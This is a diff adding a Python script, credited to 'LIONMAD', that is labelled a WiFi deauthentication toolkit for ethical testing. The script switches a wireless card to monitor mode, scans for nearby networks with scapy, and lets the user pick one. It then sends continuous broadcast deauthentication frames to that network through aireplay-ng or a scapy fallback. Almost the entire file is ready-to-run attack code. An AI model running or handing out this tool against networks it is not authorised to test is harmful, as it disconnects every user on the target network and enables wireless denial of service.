@@ -1,0 +1,229 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+### BEGIN INIT INFO
+# Provides:          wifi_toolkit
+# Required-Start:    $network $remote_fs
+# Required-Stop:     $remote_fs
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: WiFi Deauthentication Toolkit
+# Description:       A toolkit designed for WiFi network scanning and deauthentication attacks for ethical cybersecurity testing.
+# Author:
+# ++ LIONMAD <https://github.com/Midohajhouj>
+# Version:           v.1.0
+# License:           MIT License - https://opensource.org/licenses/MIT
+#### END INIT INFO ####
+
+import os
+import sys
+import time
+import threading
+import signal
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
+from colorama import Fore, Style, init
+
+# Initialize colorama
+init(autoreset=True)
+
+# Configuration
+SCAN_TIME = 10  # Default scan time in seconds
+CHANNEL_HOP_DELAY = 1  # Delay between channel hops in seconds
+
+# Global variables to track subprocesses
+running = True
+subprocesses = []
+
+# Banner
+BANNER = f"""
+{Fore.YELLOW}WiFi Deauthentication Tool{Style.RESET_ALL}
+"""
+
+def check_library(lib_name):
+    """Checks if a library is installed and prompts to install it if not."""
+    try:
+        importlib.import_module(lib_name)
+    except ImportError:
+        print(f"{lib_name} is not installed.")
+        print(f"Install it using: pip install {lib_name} --break-system-packages")
+        sys.exit(1)
+
+# ================== Third-Party Libraries ==================
+# Check for third-party libraries.
+required_libraries = [
+    "scapy", "colorama"
+]
+
+for lib in required_libraries:
+    # Handle libraries with dot notation like 'scapy.all'
+    check_library(lib.split(".")[0])
+
+# Libraries are now guaranteed to be installed. Import them.
+import scapy.all as scapy
+from colorama import Fore, Style, init
+
+def signal_handler(sig, frame):
+    """Handle Ctrl+C to gracefully exit the script."""
+    global running
+    print(f"{Fore.YELLOW}\n[*] Ctrl+C detected. Stopping all processes...{Style.RESET_ALL}")
+    running = False
+    for proc in subprocesses:
+        os.system(f"sudo pkill {proc}")
+    reset_interface(interface)
+    sys.exit(0)
+
+def check_root():
+    """Check if the script is run with root privileges."""
+    if os.geteuid() != 0:
+        print(f"{Fore.RED}[!] This script must be run as root. Use 'sudo'.{Style.RESET_ALL}")
+        sys.exit(1)
+
+def set_monitor_mode(interface):
+    """Set the wireless interface to monitor mode."""
+    print(f"{Fore.YELLOW}[*] Setting interface {interface} to monitor mode...{Style.RESET_ALL}")
+    os.system(f"sudo ifconfig {interface} down")
+    os.system(f"sudo iwconfig {interface} mode monitor")
+    os.system(f"sudo ifconfig {interface} up")
+
+def reset_interface(interface):
+    """Reset the wireless interface to managed mode."""
+    print(f"{Fore.YELLOW}[*] Resetting interface {interface} to managed mode...{Style.RESET_ALL}")
+    os.system(f"sudo ifconfig {interface} down")
+    os.system(f"sudo iwconfig {interface} mode managed")
+    os.system(f"sudo ifconfig {interface} up")
+
+def channel_hop(interface, delay=CHANNEL_HOP_DELAY):
+    """Hop through all available channels."""
+    channels = list(range(1, 15)) + [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
+    for channel in channels:
+        if not running:
+            break
+        os.system(f"sudo iwconfig {interface} channel {channel}")
+        print(f"{Fore.YELLOW}[*] Switching to channel {channel}...{Style.RESET_ALL}")
+        time.sleep(delay)
+
+def process_packet(packet, networks):
+    """Process each packet to extract WiFi network details."""
+    if packet.haslayer(Dot11Beacon):
+        ssid = packet[Dot11Elt].info.decode()
+        bssid = packet[Dot11].addr2  # MAC address of the access point
+        try:
+            channel = int(ord(packet[Dot11Elt:3].info))  # Channel number
+        except:
+            channel = "N/A"
+        strength = packet.dBm_AntSignal  # Signal strength in dBm
+        if (ssid, bssid) not in [(n[0], n[1]) for n in networks]:  # Avoid duplicates
+            networks.append((ssid, bssid, channel, strength))
+
+def wifi_scan(interface, scan_time=SCAN_TIME):
+    """Scan for WiFi networks."""
+    print(f"{Fore.YELLOW}[*] Scanning for WiFi networks on interface {interface}...{Style.RESET_ALL}")
+    networks = []
+    try:
+        sniff(iface=interface, prn=lambda x: process_packet(x, networks), timeout=scan_time)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
+    finally:
+        return networks
+
+def deauth_attack_aireplay(interface, bssid, continuous=False):
+    """Perform a deauthentication attack using aireplay-ng."""
+    print(f"{Fore.YELLOW}[*] Starting deauthentication attack using aireplay-ng on BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        if continuous:
+            print(f"{Fore.YELLOW}[*] Continuous deauthentication attack started. Press Ctrl+C to stop.{Style.RESET_ALL}")
+            while running:
+                os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")
+                time.sleep(1)  # Delay between attacks
+        else:
+            os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during deauthentication attack: {e}{Style.RESET_ALL}")
+
+def deauth_attack_scapy(interface, bssid, continuous=False):
+    """Perform a deauthentication attack using scapy."""
+    print(f"{Fore.YELLOW}[*] Starting deauthentication attack using scapy on BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        if continuous:
+            print(f"{Fore.YELLOW}[*] Continuous deauthentication attack started. Press Ctrl+C to stop.{Style.RESET_ALL}")
+            while running:
+                packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
+                sendp(packet, iface=interface, count=10, inter=0.1)
+                time.sleep(1)  # Delay between attacks
+        else:
+            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
+            sendp(packet, iface=interface, count=10, inter=0.1)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during deauthentication attack: {e}{Style.RESET_ALL}")
+
+def deauth_attack(interface, bssid, continuous=False):
+    """Perform a deauthentication attack using the best available method."""
+    if os.system("which aireplay-ng > /dev/null 2>&1") == 0:
+        deauth_attack_aireplay(interface, bssid, continuous)
+    else:
+        print(f"{Fore.YELLOW}[*] aireplay-ng not found. Falling back to scapy for deauthentication.{Style.RESET_ALL}")
+        deauth_attack_scapy(interface, bssid, continuous)
+
+def print_networks(networks):
+    """Print detected networks, separating 2.4 GHz and 5 GHz."""
+    print(f"\n{Fore.YELLOW}[*] Detected WiFi networks:{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}2.4 GHz Networks:{Style.RESET_ALL}")
+    for i, (ssid, bssid, channel, strength) in enumerate(networks):
+        if channel in range(1, 15):
+            print(f"{Fore.GREEN}{i + 1}. SSID: {ssid}, BSSID: {bssid}, Channel: {channel}, Signal Strength: {strength} dBm{Style.RESET_ALL}")
+
+    print(f"\n{Fore.CYAN}5 GHz Networks:{Style.RESET_ALL}")
+    for i, (ssid, bssid, channel, strength) in enumerate(networks):
+        if channel not in range(1, 15):
+            print(f"{Fore.GREEN}{i + 1}. SSID: {ssid}, BSSID: {bssid}, Channel: {channel}, Signal Strength: {strength} dBm{Style.RESET_ALL}")
+
+def main():
+    global interface
+    print(BANNER)  # Display banner
+
+    if len(sys.argv) != 2:
+        print(f"{Fore.RED}Usage: {sys.argv[0]} <wireless_interface>{Style.RESET_ALL}")
+        sys.exit(1)
+
+    # Check for root privileges
+    check_root()
+
+    interface = sys.argv[1]
+    set_monitor_mode(interface)
+
+    # Register the signal handler for Ctrl+C
+    signal.signal(signal.SIGINT, signal_handler)
+
+    # Scan for WiFi networks
+    networks = wifi_scan(interface)
+    if not networks:
+        print(f"{Fore.RED}[!] No networks found.{Style.RESET_ALL}")
+        reset_interface(interface)
+        sys.exit(1)
+
+    # Print networks, separating 2.4 GHz and 5 GHz
+    print_networks(networks)
+
+    # Select a network to attack
+    try:
+        choice = int(input(f"\n{Fore.YELLOW}[*] Select a network to attack (1-{len(networks)}): {Style.RESET_ALL}"))
+        if choice < 1 or choice > len(networks):
+            print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
+            reset_interface(interface)
+            sys.exit(1)
+    except ValueError:
+        print(f"{Fore.RED}[!] Invalid input.{Style.RESET_ALL}")
+        reset_interface(interface)
+        sys.exit(1)
+
+    selected_network = networks[choice - 1]
+    print(f"\n{Fore.YELLOW}[*] Selected network: SSID: {selected_network[0]}, BSSID: {selected_network[1]}, Channel: {selected_network[2]}{Style.RESET_ALL}")
+
+    # Start deauthentication attack
+    deauth_attack(interface, selected_network[1], continuous=True)
+
+    # Reset the interface to managed mode
+    reset_interface(interface)
+
+if __name__ == "__main__":
+    main()
